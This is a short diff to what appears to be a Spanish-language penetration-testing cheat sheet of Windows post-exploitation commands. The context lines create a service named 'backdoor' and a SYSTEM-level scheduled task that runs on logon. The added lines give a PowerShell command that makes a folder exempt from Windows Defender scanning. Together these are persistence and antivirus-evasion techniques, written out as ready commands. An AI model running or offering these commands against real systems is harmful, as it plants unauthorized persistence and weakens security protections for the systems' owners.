@@ -121,3 +121,7 @@ sc create backdoor binpath= "cmd.exe /k start cmd.exe" start= auto
     ```powershell
     schtasks /create /tn "PentestTask" /tr "cmd.exe /c whoami > C:\users\public\whoami.txt" /sc onlogon /ru SYSTEM
     ```
+### Crear carpeta de exclusión AV
+```
+Add-MpPreference -ExclusionPath "C:\Temp"
+```
